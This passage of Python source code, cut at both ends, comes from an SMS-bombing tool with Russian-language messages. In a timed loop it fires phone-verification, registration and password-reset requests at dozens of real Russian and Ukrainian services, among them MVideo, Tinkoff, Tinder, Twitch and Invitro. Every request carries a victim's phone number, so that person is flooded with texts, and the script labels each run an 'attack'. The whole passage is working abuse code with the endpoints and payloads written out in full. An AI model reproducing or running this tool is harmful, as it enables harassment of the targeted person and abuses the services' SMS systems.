            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Was sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
